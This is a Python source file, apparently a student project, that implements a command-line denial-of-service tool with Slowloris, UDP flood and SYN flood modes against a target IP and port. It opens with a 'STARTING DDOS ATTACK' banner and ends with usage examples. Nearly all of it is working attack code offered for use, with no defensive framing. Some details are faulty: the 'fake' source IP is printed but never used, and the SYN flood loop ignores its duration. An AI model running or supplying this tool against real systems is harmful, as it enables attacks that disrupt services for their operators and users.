from termcolor import colored
title = colored('''

 (    (                                             
 )\ ) )\ )             (        )   )            )  
(()/((()/(             )\    ( /(( /(   )     ( /(  
 /(_))/(_))  (  (   ((((_)(  )\())\()| /(  (  )\()) 
(_))_(_))_   )\ )\   )\ _ )\(_))(_))/)(_)) )\((_)\  
 |   \|   \ ((_|(_)  (_)_\(_) |_| |_((_)_ ((_) |(_) 
 | |) | |) / _ (_-<   / _ \ |  _|  _/ _` / _|| / /  
 |___/|___/\___/__/  /_/ \_\ \__|\__\__,_\__||_\_\  
                                                    
STARTING DDOS ATTACK 
Script DDos Attack PBL RKS-210
''', 'red', attrs=['bold'])



import socket
import time
import random
from random import randrange
from scapy.all import *
import argparse
import sys

class SlowlorisAttack:
    def __init__(self, target_ip, port, total_requests, timeout=None):
        self.target_ip = target_ip
        self.port = port
        self.total_requests = total_requests
        self.timeout = timeout

    def __setup_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((self.target_ip, self.port))
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except socket.error:
            pass

    def attack(self):
        self.sockets_list = []
        for _ in range(self.total_requests):
            sock = self.__setup_socket()
            if sock:
                self.sockets_list.append(sock)
        start_time = time.time()
        while True:
            if self.timeout and time.time() - start_time >= self.timeout:
                break
            for socket_item in self.sockets_list:
                try:
                    socket_item.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                except socket.error:
                    self.sockets_list.remove(socket_item)
            for _ in range(self.total_requests - len(self.sockets_list)):
                try:
                    sock = self.__setup_socket()
                    if sock:
                        self.sockets_list.append(sock)
                except socket.error:
                    break

        if not self.sockets_list: 
            print("Attack Failure {} Check your connection".format(
                len(self.sockets_list)
            ))           
        else:
            print("Slowloris attack has finished.")
            print("Total {} socket connections were made to {}:{} during {} seconds.".format(
                len(self.sockets_list), self.target_ip, self.port, self.timeout))
            sys.stdout.flush()
            

class UDPAttack:
    def __init__(self, target_ip, port, sleep, timeout=None):
        self.target_ip = target_ip
        self.port = port
        self.sleep = sleep
        self.timeout = timeout
        self.sockets_list = []

    def attack(self):
        start_time = time.time()
        while True:
            if self.timeout and time.time() - start_time >= self.timeout:
                break

            try:
                self.__send_packet()
                time.sleep(self.sleep)
            except socket.error as e:
                print("Error:", e)
                break

        self.__close_sockets()

    def __fakeip(self):
        return".".join(str(random.randint(0, 255)) for _ in range(4))

    def __send_packet(self):
        fake_ip = self.__fakeip()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sockets_list.append(sock)

        sock.sendto(random._urandom(10) * 1000, (self.target_ip, self.port))
        print("Sent packet to {} through port {} From Fake ip {}".format(self.target_ip, self.port, fake_ip))
        sock.close()

    def __close_sockets(self):
        for sock in self.sockets_list:
            sock.close()

        print("UDP attack has finished.")
        print("Total {} packets were sent to {}:{}".format(len(self.sockets_list), self.target_ip, self.port))
    


class SYNFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration

    def attack(self):
        ip = IP(dst=self.target_ip)
        tcp = TCP(sport=RandShort(), dport=self.target_port, flags="S")
        raw = Raw(b"X" * 1024)

        packet = ip / tcp / raw
        end_time = time.time() + self.duration

        try:
            while time.time() < end_time:
                send(packet, loop=True, verbose=False)
        except KeyboardInterrupt:
            print("[!] Attack stopped.")

        print("[*]Attack Finished")
        print("[!] Total {} Packets were sent to {}:{}".format( len(packet), self.target_ip, self.target_port))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DDoS Attack Script')

    parser.add_argument('attack_type', type=str, help='Type of attack to perform (slowloris / udp / syn)')
    parser.add_argument('target_ip', type=str, help='IP address of target')
    parser.add_argument('port', type=int, help='Target port number')
    parser.add_argument('--ts', type=int, default=100, help='Total number of requests for Slowloris attack (default: 100)')
    parser.add_argument('--to', type=int, default=0, help='Timeout for Slowloris attack (in seconds, default: 0)')
    parser.add_argument('--s', type=float, default=0.1, help='Sleep time for UDP attack (in seconds, default: 0.1)')

    example_text = f'''Example:
        Slowloris attack:    %(prog)s slowloris 192.168.1.1 80 --ts 1000 --to 10
        UDP attack:          %(prog)s udp 192.168.1.1 80 --s 0.005 --to 60 
        SYN flood attack:    %(prog)s syn 192.168.1.1 80 --to 10
    '''
    parser.epilog = example_text


    args = parser.parse_args()

    if args.attack_type == "slowloris":
        print(title)
        slow = SlowlorisAttack(args.target_ip, args.port, args.ts, args.to)
        slow.attack()

    elif args.attack_type == "udp":
        print(title)
        udp = UDPAttack(args.target_ip, args.port, args.s, args.to)
        udp.attack()

    elif args.attack_type == "syn":
        print(title)
        syn = SYNFlood(args.target_ip, args.port, args.to)
        syn.attack()

    else:
        print("Invalid attack type")





